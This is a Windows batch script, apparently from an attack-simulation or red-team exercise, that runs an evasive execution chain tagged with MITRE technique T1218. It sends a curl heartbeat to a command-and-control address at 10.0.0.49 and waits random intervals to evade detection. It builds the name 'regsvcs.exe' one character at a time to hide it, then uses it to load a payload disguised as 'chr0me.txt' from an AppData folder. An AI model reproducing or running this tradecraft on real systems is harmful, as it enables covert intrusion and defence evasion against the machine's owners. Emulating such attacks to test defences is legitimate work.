@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random variable names for PHR_ constants
SET txisnba=%APPDATA%\8386\c98b35d4
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8386-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=chr0me.txt
SET dvhhyc=8386
SET dgesrf=regsvcs.exe
SET lgxtm=%APPDATA%\!rrocubc!\macula-simulations.log

REM Initial random delay 30-60 seconds
SET /A randinit=!RANDOM! %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay=!randinit!s>> "!lgxtm!" 2>nul
timeout /t !randinit! /nobreak >nul

REM Character-by-character building of regsvcs.exe
SET bc1=r
SET bc2=e
SET bc3=g
SET bc4=s
SET bc5=v
SET bc6=c
SET bc7=s
SET bc8=.
SET bc9=e
SET bc10=x
SET bc11=e
SET llb=!bc1!!bc2!!bc3!!bc4!!bc5!!bc6!!bc7!!bc8!!bc9!!bc10!!bc11!

REM C2 heartbeat with curl (unchanged)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start>> "!lgxtm!" 2>nul
curl -k -s -o nul "!keghkgto!"
SET /A hbresult=!ERRORLEVEL!
IF !hbresult! EQU 0 (
    SET hbres=1
    SET hberr=
) ELSE (
    SET hbres=0
    SET hberr=connection_failed
)
echo [!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed_Binary_Proxy_Execution=!hbres!:!hberr!>> "!lgxtm!" 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_complete=!hbres!>> "!lgxtm!" 2>nul

REM Mid-script delay
SET /A midrand=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: mid_delay=!midrand!s>> "!lgxtm!" 2>nul
ping -n !midrand! 127.0.0.1 >nul

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_start>> "!lgxtm!" 2>nul
cd /d "!txisnba!"
SET /A cdres=!ERRORLEVEL!
IF !cdres! EQU 0 (
    SET cdout=1
    SET cderr=
) ELSE (
    SET cdout=0
    SET cderr=path_not_found
)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_complete=!cdout!>> "!lgxtm!" 2>nul

REM Execute regsvcs with DLL
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regsvcs_start>> "!lgxtm!" 2>nul
!llb! "!xzanpex!"
SET /A execres=!ERRORLEVEL!
IF !execres! EQU 0 (
    SET execout=1
    SET execerr=
) ELSE (
    SET execout=0
    SET execerr=assembly_load_failed
)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regsvcs_complete=!execres!>> "!lgxtm!" 2>nul

REM Final random delay
SET /A finalrand=!RANDOM! %% 15 + 10
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay=!finalrand!s>> "!lgxtm!" 2>nul
CHOICE /C Y /N /D Y /T !finalrand! >nul